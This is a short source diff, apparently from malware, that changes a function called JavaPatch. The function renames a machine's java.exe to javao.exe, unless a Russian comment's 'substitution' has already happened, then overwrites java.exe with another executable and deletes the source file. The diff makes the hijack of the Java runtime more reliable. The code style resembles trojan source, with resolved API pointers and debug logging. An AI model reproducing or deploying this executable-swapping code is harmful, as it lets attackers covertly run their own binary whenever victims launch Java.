@@ -876,16 +876,19 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			m_lstrcpy( dstJava, srcJava );
 			pPathAppendA( srcJava.str(), "java.exe" );
 			pPathAppendA( dstJava.str(), "javao.exe" );
-			if( pMoveFileA( srcJava.str(), dstJava.str() ) )
+			if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
 			{
-				DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
-				if( pCopyFileA( javaExe.str(), srcJava.str() ) )
+				if( pMoveFileA( srcJava.str(), dstJava.str() ) )
 				{
-					DBG( "JavaPatcher", "copy OK %s -> %s", javaExe.str(), srcJava.str() );
+					DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
 				}
+				else
+					DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
 			}
-			else
-				DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			if( pCopyFileA( javaExe.str(), srcJava.str(), FALSE ) )
+			{
+				DBG( "JavaPatcher", "copy OK %s -> %s", javaExe.str(), srcJava.str() );
+			}
 			pDeleteFileA(javaExe.str());
 		};
 
